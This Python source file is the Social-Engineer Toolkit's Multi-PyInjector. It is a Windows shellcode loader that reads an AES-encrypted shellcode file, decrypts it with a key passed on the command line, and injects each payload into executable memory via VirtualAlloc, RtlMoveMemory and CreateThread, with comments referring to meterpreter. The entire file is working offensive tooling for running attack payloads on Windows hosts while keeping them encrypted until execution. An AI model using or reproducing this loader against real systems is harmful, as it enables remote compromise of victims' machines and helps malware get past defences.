#
# The Social-Engineer Toolkit Multi-PyInjector revised and simplified version.
# Version: 0.2
# 
# This will spawn only a seperate thread per each shellcode instance.
#
# Much cleaner and optimized code. No longer needs files and is passed via
# command line.
#
# Incorporates AES 256 Encryption when passing shellcode

import ctypes
import threading
import sys
import subprocess
import os
import base64
from Crypto.Cipher import AES

# define our shellcode injection code through ctypes
def inject(shellcode):
    shellcode = shellcode.decode("string_escape")
    shellcode = bytearray(shellcode)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                       ctypes.c_int(len(shellcode)))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


# pull the name of file we are executing from
naming = sys.argv[0]
execute_payload = ""

# this will be our ultimate filename we use for the shellcode generate
# by the Social-Engineer Toolkit
try:
    
    # our file containing shellcode
    if len(sys.argv[1]) > 1:
        payload_filename = sys.argv[1]
        if os.path.isfile(payload_filename):
            fileopen = file(payload_filename, "r")
            shellcode = fileopen.read()
        # if we didn't file our shellcode path then exit out
        if not os.path.isfile(payload_filename):
            sys.exit()

    if len(sys.argv[2]) > 1:
        # this is our secret key for decrypting the AES encrypted traffic
        secret = sys.argv[2]
        secret = base64.b64decode(secret)
        # the character used for padding--with a block cipher such as AES, the value
        # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
        # used to ensure that your value is always a multiple of BLOCK_SIZE
        PADDING = '{'
        BLOCK_SIZE = 32
        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
        # one-liners to decrypt a string which will be our shellcode
        DecryptAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
        cipher = AES.new(secret)
        # our decrypted value for shellcode
        shellcode = DecryptAES(cipher, shellcode)
        # split our shellcode into a list
        shellcode = shellcode.split(",")
    
# except an indexerror and allow it to continue forward
except IndexError:
    sys.exit()

# see if subprocess graced us with shellcode
try:
    
    execute_payload = sys.argv[3]
    
except:
    pass

counter = 1
if execute_payload == "":
    for payload in shellcode:
        if payload != "":
            # seperate process needed in order to work
            # meterpreter crashes entire stack via ctypes
            # standard threading does not work
            subprocess.Popen(naming + " 1 1 " + payload, shell=True)

# if we passed a second argument through subprocess
# execute and inject the shellcode        
if execute_payload != "":
    inject(execute_payload)

